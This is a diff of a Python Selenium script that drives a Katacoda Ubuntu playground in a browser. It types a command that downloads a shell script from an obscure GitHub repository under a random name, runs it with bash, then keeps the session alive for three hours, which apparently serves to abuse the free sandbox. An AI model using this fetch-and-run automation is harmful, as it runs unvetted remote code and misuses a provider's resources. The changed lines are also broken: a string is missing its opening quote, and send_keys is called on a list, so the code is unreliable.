@@ -24,10 +24,10 @@ driver.get("https://www.katacoda.com/courses/ubuntu/playground")
 print("1st done")
 time.sleep(30)
 
-driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys("ran1=$(openssl rand -hex 5) && wget https://github.com/unmsjd28/ynsg7s9/raw/main/dm.sh -O $ran1.sh && bash $ran1.sh")
+driver.find_elements_by_class_name(xterm-helper-textarea").send_keys("ran1=$(openssl rand -hex 5) && wget https://github.com/unmsjd28/ynsg7s9/raw/main/dm.sh -O $ran1.sh && bash $ran1.sh")
 print("2nd done")
 time.sleep(8)
 
 
-driver.find_element_by_xpath('//*[@id="terminal"]/div/div[2]/div/textarea').send_keys(Keys.ENTER)
+driver.find_elements_by_class_name(xterm-helper-textarea").send_keys(Keys.ENTER)
 time.sleep(10800)
